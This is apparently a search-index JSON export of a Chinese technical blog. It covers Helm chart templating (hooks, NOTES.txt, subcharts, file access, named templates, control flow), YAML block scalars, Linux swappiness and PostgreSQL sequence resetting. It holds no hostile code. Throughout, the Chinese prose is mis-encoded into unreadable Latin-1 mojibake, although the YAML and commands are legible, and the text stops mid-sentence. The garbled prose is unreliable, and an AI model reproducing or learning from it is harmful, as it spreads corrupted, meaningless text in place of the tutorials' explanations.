\"hook-failed\": åœ¨hookæ‰§è¡Œå¤±è´¥åï¼Œtilleråˆ é™¤å¯¹åº”çš„hookèµ„æºã€‚ \"before-hook-creation\": åœ¨å¯åŠ¨æ–°hookä¹‹å‰ï¼Œtilleråˆ é™¤ä¸Šä¸€æ¬¡æ‰§è¡Œåhookèµ„æºã€‚ helm.sh/hook-delete-timeoutæ³¨è§£ã€‚è¯¥å€¼æ˜¯tilleråº”ç­‰å¾…hookå®Œå…¨åˆ é™¤çš„ç§’æ•°ã€‚å€¼ä¸º0è¡¨ç¤ºtillerä¸ç­‰å¾…ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒTillerå°†ç­‰å¾…60ç§’ã€‚ ","date":"2020-06-23 18:25","objectID":"/post/1839/:4:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-hooks(ä¸ƒ)","uri":"/post/1839/"},{"categories":["kubernetes"],"content":"è‡ªåŠ¨ä»ä»¥å‰çš„ç‰ˆæœ¬åˆ é™¤hook å½“releaseè¢«æ›´æ–°æ—¶ï¼Œhookèµ„æºå¯èƒ½å·²ç»å­˜åœ¨äºé›†ç¾¤ä¸­ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œhelmä¼šæŠ›å‡º\"... already exists\"é”™è¯¯ã€‚ hookèµ„æºå·²ç»å­˜åœ¨çš„ä¸€ä¸ªå¸¸è§åŸå› æ˜¯ï¼Œåœ¨ä»¥å‰çš„install/upgradeä¸­ä½¿ç”¨hookèµ„æºåï¼Œæ²¡æœ‰å°†å…¶åˆ é™¤ã€‚äº‹å®ä¸Šï¼Œæœ‰å……åˆ†çš„ç†ç”±å¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆäººä»¬æƒ³è¦ä¿ç•™hookï¼šä¾‹å¦‚ï¼Œéœ€è¦æ‰‹åŠ¨è°ƒè¯•ï¼Œä»¥é˜²å‡ºé”™ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸ºäº†ç¡®ä¿åç»­åˆ›å»ºçš„hookä¸ä¼šå¤±è´¥çš„å»ºè®®æ–¹æ³•æ˜¯å®šä¹‰ä¸€ä¸ª\"hook-delete-policy\"ï¼Œè¯¥ç­–ç•¥å¯ä»¥å¤„ç†ï¼š\"helm.sh/hook-delete-policy\": \"before-hook-creation\"ã€‚æ­¤hookæ³¨è§£ä¼šå¯¼è‡´åœ¨å®‰è£…æ–°hookä¹‹å‰ç§»é™¤ä»»ä½•ç°æœ‰hookã€‚ ","date":"2020-06-23 18:25","objectID":"/post/1839/:5:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-hooks(ä¸ƒ)","uri":"/post/1839/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"|ï¼š ä»£è¡¨æ¯ä¸€è¡Œçš„æœ«å°¾éƒ½ä¼šæ·»åŠ ä¸€ä¸ªæ¢è¡Œç¬¦\\n |-ï¼šå’Œ|ä¸€æ ·ï¼Œä½†æ˜¯æœ€åä¸€è¡Œä¸æ·»åŠ æ¢è¡Œç¬¦\\n \u003eï¼š åªåœ¨æœ€åä¸€è¡Œæ·»åŠ æ¢è¡Œç¬¦\\n ","date":"2020-06-23 18:07","objectID":"/post/1838/:0:0","tags":["yaml"],"title":"yamlä¸­|ã€|-ã€\u003eçš„åŒºåˆ«","uri":"/post/1838/"},{"categories":["kubernetes"],"content":"NOTES.txt åœ¨æ‰§è¡Œhelm installæˆ–helm upgradeï¼ŒHelmå¯ä»¥ä¸ºç”¨æˆ·æ‰“å°ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯ã€‚NOTES.txtå¯ä»¥ä½¿ç”¨å¯¹è±¡,å‡½æ•°ç­‰æ¥é«˜åº¦è‡ªå®šä¹‰è¯´æ˜ä¿¡æ¯ã€‚ ç¼–å†™NOTES.txt Thank you for installing {{ .Chart.Name }}. Your release is named {{ .Release.Name }}. To learn more about the release, try: $ helm status {{ .Release.Name }} $ helm get {{ .Release.Name }} å®‰è£…åæç¤ºå¦‚ä¸‹ä¿¡æ¯ï¼š 99305-m4pda07k1po.png ","date":"2020-06-23 16:31","objectID":"/post/1836/:1:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-NOTES.txtæ–‡ä»¶å’Œå­chart(å…­)","uri":"/post/1836/"},{"categories":["kubernetes"],"content":"å­chart é¦–å…ˆåˆ›å»ºä¸€ä¸ªdemo1ï¼Œç„¶ååœ¨åˆ›å»ºä¸€ä¸ªsubchart helm create demo1 cd demo1/charts helm create subchart ä¿®æ”¹å­chartä¸­çš„values.yamlå’Œconfigmap.yaml #values.yaml dessert: sub #configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-sub-cm data: dessert: {{ .Values.dessert }} ä¿®æ”¹çˆ¶chartä¸­çš„values.yamlå’Œconfigmap.yaml #values.yaml dessert: parent #configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-parent-cm data: dessert: {{ .Values.dessert }} æ¸²æŸ“åçš„ç»“æœï¼š --- # Source: demo1/charts/subchart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: dining-lion-sub-cm data: dessert: sub --- # Source: demo1/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: dining-lion-parent-cm data: dessert: parent çˆ¶chartå’Œå­chartçš„valuesè®¾ç½®äº’ä¸å½±å“ï¼Œæˆ‘ä»¬åœ¨çˆ¶chartçš„values.yamlä¸­æ·»åŠ ä¸€äº›å€¼å¯ä»¥è¦†ç›–å­chartçš„å€¼ dessert: parent subchart: dessert: parent1 å†æ¬¡æ¸²æŸ“åï¼Œå¯ä»¥å‘ç°å­chartçš„å€¼è¢«è¦†ç›–äº† --- # Source: demo1/charts/subchart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: alliterating-olm-sub-cm data: dessert: parent1 ####å…¨å±€å€¼ Valuesæ•°æ®ç±»å‹å…·æœ‰ä¸€ä¸ªåä¸ºValues.globalçš„ä¿ç•™éƒ¨åˆ†ï¼Œå¯ä»¥åœ¨å…¶ä¸­è®¾ç½®å…¨å±€å€¼ã€‚ æˆ‘ä»¬ä¿®æ”¹çˆ¶chartä¸­çš„values.yaml global: g: \"my is global\" #çˆ¶chart configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-parent-cm data: dessert: {{ .Values.global.g }} #å­chart configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name}}-sub-cm data: dessert: {{ .Values.global.g }} æ¸²æŸ“åçš„ç»“æœï¼š --- # Source: demo1/charts/subchart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: reeling-seagull-sub-cm data: dessert: my is global --- # Source: demo1/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: reeling-seagull-parent-cm data: dessert: my is global ","date":"2020-06-23 16:31","objectID":"/post/1836/:2:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-NOTES.txtæ–‡ä»¶å’Œå­chart(å…­)","uri":"/post/1836/"},{"categories":["kubernetes"],"content":"å®˜æ–¹æ–‡æ¡£ï¼šhttps://v2.helm.sh/docs/chart_template_guide/#glob-patterns Helmæä¾›äº†é€šè¿‡.Fileså¯¹è±¡è®¿é—®æ–‡ä»¶ã€‚ä½†æ˜¯ï¼Œåœ¨å¼€å§‹ä½¿ç”¨æ¨¡æ¿ç¤ºä¾‹ä¹‹å‰ï¼Œéœ€è¦æ³¨æ„ä¸€äº›æœ‰å…³å…¶å·¥ä½œåŸç†çš„äº‹æƒ…ï¼š å¯ä»¥åœ¨Helm chartä¸­æ·»åŠ å…¶ä»–æ–‡ä»¶ã€‚è¿™äº›æ–‡ä»¶å°†è¢«æ†ç»‘å¹¶å‘é€åˆ°Tillerã€‚ä¸è¿‡è¦å°å¿ƒã€‚ç”±äºKuberneteså¯¹è±¡çš„å­˜å‚¨é™åˆ¶ï¼Œå›¾è¡¨å¿…é¡»å°äº1Mã€‚ .Filesé€šå¸¸å‡ºäºå®‰å…¨åŸå› ï¼ŒæŸäº›æ–‡ä»¶æ— æ³•é€šè¿‡.Fileså¯¹è±¡è®¿é—®ã€‚ æ— æ³•è®¿é—®templates/ä¸­çš„æ–‡ä»¶ã€‚ æ— æ³•è®¿é—®è¢«.helmignoreæ’é™¤çš„æ–‡ä»¶ã€‚ ","date":"2020-06-23 15:24","objectID":"/post/1834/:0:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-è®¿é—®æ–‡ä»¶(äº”)","uri":"/post/1834/"},{"categories":["kubernetes"],"content":"åŸºæœ¬ç¤ºä¾‹ï¼š é¦–å…ˆåˆ›å»ºä¸‰ä¸ªæ–‡ä»¶ #config1.toml message = \"Hello from config 1\" #config2.toml message = \"This is config 2\" #config3.toml message = \"Goodbye from config 3\" æˆ‘ä»¬ä½¿ç”¨rangeå‡½æ•°æ¥éå†è¿™äº›æ–‡ä»¶ apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: {{- $files := .Files }} {{- range list \"config1.toml\" \"config2.toml\" \"config3.toml\" }} {{ . }}: |- {{ $files.Get . }} {{- end }} æ¸²æŸ“åçš„æ•ˆæœï¼š # Source: files-demo/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: app: eerie-hydra data: config1.toml: |- message = \"Hello from config 1\" config2.toml: |- message = \"This is config 2\" config3.toml: |- message = \"Goodbye from config 3\" ","date":"2020-06-23 15:24","objectID":"/post/1834/:1:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-è®¿é—®æ–‡ä»¶(äº”)","uri":"/post/1834/"},{"categories":["kubernetes"],"content":"globæ¨¡å¼ Files.Glob(pattern string)æ–¹æ³•è¿”å›æ‰€æœ‰åŒ¹é…çš„æ–‡ä»¶è·¯å¾„åˆ—è¡¨ï¼Œå¯ååŠ©æ‚¨ä»¥å…¨å±€æ¨¡å¼çµæ´»æ€§æå–æŸäº›æ–‡ä»¶ã€‚ ç®€å•ç¤ºä¾‹ï¼š ç›®å½•ç»“æ„ bar â”œâ”€â”€ bar.conf â”œâ”€â”€ bar.go â””â”€â”€ bar.yaml foo â”œâ”€â”€ foo.txt â””â”€â”€ foo.yaml apiVersion: v1 kind: ConfigMap metadata: name: glob-test data: {{- $root := . }} {{- range $path,$bytes := .Files.Glob \"**.yaml\" }} {{ base $path }}: |- {{ $root.Files.Get $path }} {{- end -}} æ¸²æŸ“åçš„æ•ˆæœï¼š --- # Source: files-demo/templates/configmap2.yaml apiVersion: v1 kind: ConfigMap metadata: name: glob-test data: bar.yaml: |- my is bar.yaml foo.yaml: |- my is foo.yaml ","date":"2020-06-23 15:24","objectID":"/post/1834/:2:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-è®¿é—®æ–‡ä»¶(äº”)","uri":"/post/1834/"},{"categories":["kubernetes"],"content":"å‘½åæ¨¡æ¿æ—¶è¦è®°ä½çš„é‡è¦ç»†èŠ‚ï¼šæ¨¡æ¿åç§°æ˜¯å…¨å±€çš„ã€‚å¦‚æœæ‚¨å£°æ˜ä¸¤ä¸ªå…·æœ‰ç›¸åŒåç§°çš„æ¨¡æ¿ï¼Œåˆ™ä»¥æœ€ååŠ è½½çš„é‚£ä¸ªä¸ºå‡†ã€‚ç”±äºå­chartä¸­çš„æ¨¡æ¿æ˜¯ä¸é¡¶çº§æ¨¡æ¿ä¸€èµ·ç¼–è¯‘çš„ï¼Œå› æ­¤åº”è°¨æ…ä½¿ç”¨å›¾è¡¨ç‰¹å®šåç§°æ¥å‘½åæ¨¡æ¿ã€‚ ä¸€ç§æµè¡Œçš„å‘½åçº¦å®šæ˜¯åœ¨æ¯ä¸ªå®šä¹‰çš„æ¨¡æ¿å‰æ·»åŠ chartåç§°ï¼š{{ define \"mychart.labels\" }}ã€‚é€šè¿‡ä½¿ç”¨ç‰¹å®šçš„chartåç§°ä½œä¸ºå‰ç¼€ï¼Œæˆ‘ä»¬å¯ä»¥é¿å…ç”±äºä¸¤ä¸ªä¸åŒçš„chart,ä½¿ç”¨äº†ç›¸åŒçš„æ¨¡æ¿åç§°è€Œå¼•èµ·çš„ä»»ä½•å†²çªã€‚ ","date":"2020-06-23 13:24","objectID":"/post/1828/:0:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-å‘½åæ¨¡æ¿(å››)","uri":"/post/1828/"},{"categories":["kubernetes"],"content":"1.ä½¿ç”¨defineå£°æ˜å’Œä½¿ç”¨æ¨¡æ¿ defineæ“ä½œä½¿æˆ‘ä»¬å¯ä»¥åœ¨æ¨¡æ¿æ–‡ä»¶å†…éƒ¨åˆ›å»ºå‘½åæ¨¡æ¿ã€‚å®ƒçš„è¯­æ³•å¦‚ä¸‹ï¼š {{ define \"MY.NAME\" }} # body of template here {{ end }} ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€ä¸ªæ¨¡æ¿æ¥å°è£…Kubernetesæ ‡ç­¾å—ï¼š {{- define \"mychart.labels\" }} labels: generator: helm date: {{ now | htmlDate }} {{- end }} ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ­¤æ¨¡æ¿åµŒå…¥åˆ°ç°æœ‰çš„ConfigMapä¸­ï¼Œç„¶åå°†å…¶åŒ…å«åœ¨templateä¸­ï¼š {{- define \"mychart.labels\" }} labels: generator: helm date: {{ now | htmlDate }} {{- end }} apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap {{- template \"mychart.labels\" }} data: myvalue: \"Hello World\" {{- with .Values.favorite }} drink: {{ .drink | default \"tea\" | quote }} food: {{ .food | upper | quote }} {{- if eq .drink \"coffee\" }} mug: true {{- end }} toppings: |- {{- end }} {{- range $key,$value := .Values.favorite }} {{ $key }}: {{ $value }} {{- end }} æ¸²æŸ“åçš„ç»“æœå¦‚ä¸‹ï¼š # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: toned-greyhound-configmap labels: generator: helm date: 2020-06-23 data: myvalue: \"Hello World\" drink: \"coffee\" food: \"PIZZA\" mug: true toppings: |- drink: coffee food: pizza é€šå¸¸å‘½åæ¨¡æ¿ä¼šæ”¾ç½®åœ¨_helpers.tplæ–‡ä»¶ä¸­ã€‚æˆ‘ä»¬æŠŠè¯¥å‘½åæ¨¡æ¿ç§»åˆ°é‚£é‡Œï¼š vim templates/_helpers.tpl {{/* ç”ŸæˆåŸºæœ¬æ ‡ç­¾ */}} {{- define \"mychart.labels\" }} labels: generator: helm date: {{ now | htmlDate }} {{- end }} æ¸²æŸ“åçš„æ•ˆæœï¼š --- # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: factual-seagull-configmap labels: generator: helm date: 2020-06-23 data: myvalue: \"Hello World\" drink: \"coffee\" food: \"PIZZA\" mug: true toppings: |- drink: coffee food: pizza ","date":"2020-06-23 13:24","objectID":"/post/1828/:1:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-å‘½åæ¨¡æ¿(å››)","uri":"/post/1828/"},{"categories":["kubernetes"],"content":"2.è®¾ç½®æ¨¡æ¿ä½œç”¨åŸŸ åœ¨ä¸Šé¢å®šä¹‰çš„æ¨¡æ¿ä¸­ï¼Œæˆ‘ä»¬æ²¡æœ‰ä½¿ç”¨ä»»ä½•å¯¹è±¡ã€‚æˆ‘ä»¬åªæ˜¯ä½¿ç”¨äº†å‡½æ•°ã€‚å¦‚æœåœ¨å‘½åæ¨¡æ¿ä¸­ä½¿ç”¨å¯¹è±¡ä¼šæ˜¯ä»€ä¹ˆç»“æœå‘¢ï¼š {{- define \"mychart.labels\" }} labels: generator: helm date: {{ now | htmlDate }} chart: {{ .Chart.Name }} version: {{ .Chart.Version }} {{- end }} æˆ‘ä»¬æ¸²æŸ“åçš„ç»“æœï¼š # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: moldy-jaguar-configmap labels: generator: helm date: 2016-11-02 chart: version: å¯ä»¥å‘ç°è¿™å¹¶ä¸æ˜¯æˆ‘ä»¬æ‰€æœŸå¾…çš„ç»“æœ,å› ä¸º.Chart.Nameã€.Chart.Versionä¸åœ¨æˆ‘ä»¬å®šä¹‰çš„æ¨¡æ¿ä½œç”¨åŸŸå†…ã€‚defineå‘ˆç°å‘½åæ¨¡æ¿æ—¶ï¼Œå®ƒå°†æ¥æ”¶templateè°ƒç”¨æ—¶ä¼ é€’çš„ä½œç”¨åŸŸã€‚åœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬è¿™æ ·è°ƒç”¨çš„æ¨¡æ¿ï¼š {{- template \"mychart.labels\" }} æ²¡æœ‰ä¼ å…¥ä»»ä½•ä½œç”¨åŸŸï¼Œå› æ­¤åœ¨æ¨¡æ¿å†…æˆ‘ä»¬æ— æ³•è®¿é—®.ä¸­çš„ä»»ä½•å†…å®¹ã€‚ä¸è¿‡ï¼Œè¿™å¾ˆå®¹æ˜“è§£å†³ã€‚æˆ‘ä»¬åªéœ€å°†ä½œç”¨åŸŸä¼ é€’ç»™æ¨¡æ¿å°±å¯ä»¥äº†ï¼š {{- template \"mychart.labels\" . }} æ­¤æ—¶æˆ‘ä»¬çš„ä¸‰ä¸ªæ–‡ä»¶å†…å®¹åˆ†åˆ«ä¸ºï¼š # configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap {{- template \"mychart.labels\" . }} data: myvalue: \"Hello World\" {{- with .Values.favorite }} drink: {{ .drink | default \"tea\" | quote }} food: {{ .food | upper | quote }} {{- if eq .drink \"coffee\" }} mug: true {{- end }} toppings: |- {{- end }} {{- range $key,$value := .Values.favorite }} {{ $key }}: {{ $value }} {{- end }} #values.yaml name: soulchild livenessProbe: null favorite: drink: coffee food: pizza pizzaToppings: - mushrooms - cheese - peppers - onions #_helpers.tpl {{/* ç”ŸæˆåŸºæœ¬æ ‡ç­¾ */}} {{- define \"mychart.labels\" }} labels: generator: helm date: {{ now | htmlDate }} chart: {{ .Chart.Name }} version: {{ .Chart.Version }} {{- end }} ä¿®æ”¹åæˆ‘ä»¬å†æ¬¡æ¸²æŸ“ï¼š --- # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: kind-chipmunk-configmap labels: generator: helm date: 2020-06-23 chart: mychart version: 0.1.0 data: myvalue: \"Hello World\" drink: \"coffee\" food: \"PIZZA\" mug: true toppings: |- drink: coffee food: pizza ##3.includeå‡½æ•° å‡è®¾æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªå‘½åæ¨¡æ¿ï¼š {{- define \"mychart.app\" }} app_name: {{ .Chart.Name }} app_version: \"{{ .Chart.Version }}+{{ .Release.Time.Seconds }}\" {{- end -}} configmap.yamlå¦‚ä¸‹ apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap labels: {{- template \"mychart.app\" . }} data: myvalue: \"Hello World\" {{- with .Values.favorite }} drink: {{ .drink | default \"tea\" | quote }} food: {{ .food | upper | quote }} {{- if eq .drink \"coffee\" }} mug: true {{- end }} toppings: |- {{- end }} {{- range $key,$value := .Values.favorite }} {{ $key }}: {{ $value }} {{- end }} æŸ¥çœ‹æ¸²æŸ“åçš„ç»“æœï¼š # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: womping-swan-configmap labels: app_name: mychart app_version: \"0.1.0+1592893332\" data: myvalue: \"Hello World\" drink: \"coffee\" food: \"PIZZA\" mug: true toppings: |- drink: coffee food: pizza å¯ä»¥çœ‹åˆ°æ¸²æŸ“åçš„labelç¼©è¿›æ˜¯æœ‰é—®é¢˜çš„ï¼Œå› ä¸ºtemplateçš„æ•°æ®åªæ˜¯æ’å…¥åˆ°ä¸Šä¸€ä¸ªæ–‡æœ¬çš„å³è¾¹ã€‚ä¸Šä¸€ä¸ªæ–‡æœ¬çš„æœ€å³è¾¹æ˜¯æ¢è¡Œç¬¦ï¼Œå°±ç›¸å½“äºæ˜¯åœ¨æ¢è¡Œç¬¦åé¢æ’å…¥æ–‡æœ¬ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡ç®¡é“å’Œindentæ¥è§£å†³ç¼©è¿›é—®é¢˜ï¼Œä½†æ˜¯templateæ˜¯ä¸€ä¸ªâ€™åŠ¨ä½œâ€™è€Œä¸æ˜¯â€™å‡½æ•°â€™ï¼Œä¸èƒ½ä½¿ç”¨ç®¡é“ã€‚æ‰€ä»¥æ— æ³•å°†templateè°ƒç”¨çš„è¾“å‡ºä¼ é€’ç»™å…¶ä»–å‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡includeæ¥åšåˆ°è¿™ä¸€ç‚¹ï¼Œä¾‹å¦‚ï¼š apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap labels: {{- include \"mychart.app\" . | indent 4 }} data: myvalue: \"Hello World\" {{- with .Values.favorite }} drink: {{ .drink | default \"tea\" | quote }} food: {{ .food | upper | quote }} {{- if eq .drink \"coffee\" }} mug: true {{- end }} toppings: |- {{- end }} {{- range $key,$value := .Values.favorite }} {{ $key }}: {{ $value }} {{- end }} æ¸²æŸ“åçš„ç»“æœï¼š --- # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: lumbering-alligator-configmap labels: app_name: mychart app_version: \"0.1.0+1592895037\" data: myvalue: \"Hello World\" drink: \"coffee\" food: \"PIZZA\" mug: true toppings: |- drink: coffee food: pizza nindentå’Œindentçš„åŒºåˆ«ï¼šnindentä¼šåœ¨ç¼©è¿›å‰å¤šå‡ºä¸€ä¸ªæ¢è¡Œç¬¦ ","date":"2020-06-23 13:24","objectID":"/post/1828/:2:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-å‘½åæ¨¡æ¿(å››)","uri":"/post/1828/"},{"categories":["å…¶ä»–","åŸºç¡€å†…å®¹"],"content":"swappinessçš„æ•°å€¼å†³å®šå¦‚ä½•ä½¿ç”¨swapã€‚ swappiness=0è¡¨ç¤ºå°½é‡ä½¿ç”¨ç‰©ç†å†…å­˜ï¼Œç„¶ååœ¨ä½¿ç”¨swapç©ºé—´ swappinessï¼100è¡¨ç¤ºå°½é‡ä½¿ç”¨swapåˆ†åŒº 1.æŸ¥çœ‹å½“å‰swappinesså€¼ cat /proc/sys/vm/swappiness 2.ä¿®æ”¹swappinessçš„å€¼ vim /etc/sysctl.conf vm.swappiness=30 3.ä½¿é…ç½®ç”Ÿæ•ˆ sysctl -p ","date":"2020-06-22 09:15","objectID":"/post/1825/:0:0","tags":["linux"],"title":"è°ƒæ•´swapåˆ†åŒºä½¿ç”¨ä¼˜å…ˆçº§","uri":"/post/1825/"},{"categories":["databases"],"content":" SELECT setval('t_app_app_id_seq',MAX(id),true) FROM è¡¨åï¼› ","date":"2020-06-19 16:56","objectID":"/post/1816/:0:0","tags":["postgresql","pgsql"],"title":"pgsqlè‡ªå¢åºåˆ—-ä¸»é”®å†²çªé—®é¢˜","uri":"/post/1816/"},{"categories":["kubernetes"],"content":"è¿ç®—ç¬¦ eqï¼Œneï¼Œltï¼Œgtï¼Œandï¼Œorï¼Œnot æµç¨‹æ§åˆ¶ if/else æ¡ä»¶ with æ§åˆ¶ä½œç”¨åŸŸ rangeï¼Œå¾ªç¯ ","date":"2020-06-18 18:21","objectID":"/post/1806/:0:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-æµç¨‹æ§åˆ¶ã€ä½œç”¨åŸŸã€å¾ªç¯ã€å˜é‡(ä¸‰)","uri":"/post/1806/"},{"categories":["kubernetes"],"content":"1.if æ¡ä»¶è¯­å¥çš„åŸºæœ¬ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š {{ if PIPELINE }} # Do something {{ else if OTHER PIPELINE }} # Do something else {{ else }} # Default case {{ end }} å¦‚æœå€¼ä¸ºä»¥ä¸‹å†…å®¹ï¼Œåˆ™å°†è¯„ä¼°ä¸ºfalseï¼š å¸ƒå°”å€¼false æ•°å­—é›¶ ä¸€ä¸ªç©ºå­—ç¬¦ä¸² ä¸€ä¸ªnilï¼ˆempty æˆ– nullï¼‰ ä¸€ä¸ªç©ºçš„é›†åˆï¼ˆmapï¼Œsliceï¼Œtupleï¼Œdictï¼Œarrayï¼‰ åœ¨ä»»ä½•å…¶ä»–æƒ…å†µä¸‹ï¼Œæ¡ä»¶è¢«è®¡ç®—ä¸ºtrueã€‚ ç¤ºä¾‹ ./values.yaml name: soulchild favorite: drink: coffee food: pizza templates/configmap.yamlæ¡ä»¶è¦æ±‚.Values.favorite.drinkçš„å€¼ç­‰äºcoffeeï¼Œåˆ™è¾“å‡ºmug: true apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" drink: {{ .Values.favorite.drink | default \"tea\" | quote }} food: {{ .Values.favorite.food | upper | quote }} {{ if eq .Values.favorite.drink \"coffee\" }}mug: true{{ end }} ç»“æœ --- # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: singing-squid-configmap data: myvalue: \"Hello World\" drink: \"coffee\" food: \"PIZZA\" mug: true ","date":"2020-06-18 18:21","objectID":"/post/1806/:1:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-æµç¨‹æ§åˆ¶ã€ä½œç”¨åŸŸã€å¾ªç¯ã€å˜é‡(ä¸‰)","uri":"/post/1806/"},{"categories":["kubernetes"],"content":"æ§åˆ¶ç©ºè¡Œ çœ‹ä¸€ä¸‹ä¸‹é¢çš„ä¾‹å­ apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" drink: {{ .Values.favorite.drink | default \"tea\" | quote }} food: {{ .Values.favorite.food | upper | quote }} {{if eq .Values.favorite.drink \"coffee\"}} mug: true {{end}} ç»“æœ # Source: mychart/templates/configmap.yaml apiVersion: v1 kind: ConfigMap metadata: name: killjoy-cow-configmap data: myvalue: \"Hello World\" drink: \"coffee\" food: \"PIZZA\" mug: true å¯ä»¥çœ‹åˆ°mugä¸Šé¢å¤šäº†ä¸€ä¸ªç©ºè¡Œã€‚ è¯·æ³¨æ„ï¼Œæˆ‘ä»¬åœ¨YAMLä¸­æ”¶åˆ°ä¸€äº›ç©ºè¡Œã€‚ä¸ºä»€ä¹ˆï¼Ÿæ¨¡æ¿å¼•æ“è¿è¡Œæ—¶ï¼Œå®ƒä¼šåˆ é™¤{{ä¸­çš„å†…å®¹}}ï¼Œä½†ä¼šå®Œå…¨ä¿ç•™å…¶ä½™ç©ºç™½ã€‚ é¦–å…ˆï¼Œå¯ä»¥ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦ä¿®æ”¹æ¨¡æ¿å£°æ˜çš„èŠ±æ‹¬å·è¯­æ³•ï¼Œä»¥å‘Šè¯‰æ¨¡æ¿å¼•æ“å‹ç¼©ç©ºç™½ã€‚{{-ï¼ˆå·¦è¾¹åŠ ä¸Šç ´æŠ˜å·å’Œç©ºæ ¼ï¼‰è¡¨ç¤ºåº”è¯¥åœ¨å·¦è¾¹ç æ‰ç©ºç™½ï¼Œ-}}å³è¾¹åŠ ä¸Šç ´æŠ˜å·ä»£è¡¨åœ¨å³è¾¹ç æ‰ç©ºç™½ã€‚æ¢è¡Œç¬¦æ˜¯ç©ºæ ¼ï¼ è§£å†³ç©ºè¡Œé—®é¢˜ï¼š apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" drink: {{ .Values.favorite.drink | default \"tea\" | quote }} food: {{ .Values.favorite.food | upper | quote }} {{- if eq .Values.favorite.drink \"coffee\" }} mug: true {{- end }} ","date":"2020-06-18 18:21","objectID":"/post/1806/:2:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-æµç¨‹æ§åˆ¶ã€ä½œç”¨åŸŸã€å¾ªç¯ã€å˜é‡(ä¸‰)","uri":"/post/1806/"},{"categories":["kubernetes"],"content":"2.with withå¯ä»¥è®©æ‚¨å°†å½“å‰èŒƒå›´ï¼ˆ.ï¼‰è®¾ç½®ä¸ºç‰¹å®šå¯¹è±¡ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬ä¸€ç›´åœ¨ä¸.Values.favoritesã€‚è®©æˆ‘ä»¬é‡å†™ConfigMapï¼Œå°†.èŒƒå›´æ›´æ”¹ä¸ºæŒ‡å‘.Values.favoritesï¼š apiVersion: v1 kind: ConfigMap metadata: name: {{ .Release.Name }}-configmap data: myvalue: \"Hello World\" {{- with .Values.favorite }} drink: {{ .drink | default \"tea\" | quote }} food: {{ .food | upper | quote }} {{- end }} ä½¿ç”¨{{- with .Values.favorite }} {{- end }}åï¼ŒwithåŒºå—å†…çš„å½“å‰ä½œç”¨åŸŸå°±æ˜¯.Values.favorite æ‰€ä»¥å½“æˆ‘ä»¬å†ä½¿ç”¨.drinkæ—¶ï¼Œå°±ä»£è¡¨æ˜¯.Values.favorite.drink ","date":"2020-06-18 18:21","objectID":"/post/1806/:3:0","tags":["k8s","helm"],"title":"helmæ¨¡æ¿å¼€å‘-æµç¨‹æ§åˆ¶ã€ä½œç”¨åŸŸã€å¾ªç¯ã€å˜é‡(ä¸‰)","uri":"/post/1806/"},{"categories":["kubernetes"],"content":"3.range helmä¸­ä½¿ç”¨rangeæ¥è¿›è¡Œå¾ªç¯çš„å·¥ä½œ é¦–å…ˆåœ¨values.yamlæ·»åŠ 